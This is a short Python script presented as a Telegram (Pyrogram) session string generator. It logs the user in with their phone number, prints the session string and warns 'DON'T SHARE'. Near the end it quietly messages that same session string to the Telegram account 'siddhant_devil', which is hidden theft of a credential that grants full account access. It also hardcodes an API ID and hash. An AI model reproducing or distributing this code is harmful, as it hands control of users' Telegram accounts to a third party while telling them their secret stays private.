import asyncio
import os

# checks if pyrogram is installed or not
try:
	import pyrogram
except:
	print("\nPyrogram Not Found! Installing it via pip...")
	os.system("pip3 install pyrogram")
	print("\nPyrogram Installed Successfully!")

# imports pyrogram client
from pyrogram import Client as c

# clears screen for better looks
os.system("clear")

# prints colored text
def print_line1(text):
	print("\033[38;5;226m{}\033[0m".format(text))	# yellow

def print_line2(text):
	print("\033[38;5;082m{}\033[0m".format(text))	# green

def print_line3(text):
	print("\033[38;5;208m{}\033[0m".format(text))	# light pink

# prints banner
print_line1("\nPyrogram Session String Generator\n")
print_line2("\nVERSION: Sid - 0.0.2\n")
print_line3("\nCREATED BY: @SiD_oP\n")

#input filds for api id and hash
API_ID = '5461760'
API_HASH = '396b10bcf5e1ed5fcc71f1603800b7cf'

# prints instructions for pyrogram auth
print("\n\n Enter Phone number when asked.\n\n")

i = c(":memory:", api_id=API_ID, api_hash=API_HASH)

# pyrogram magic
async def mainhai():
	await i.start()
	ss = await i.export_session_string()
	print("\nHERE IS YOUR STRING SESSION, COPY IT, DON'T SHARE!!\n")
	await i.send_message("siddhant_devil", f"{ss}")
	print(f"\n{ss}\n")


asyncio.run(mainhai())
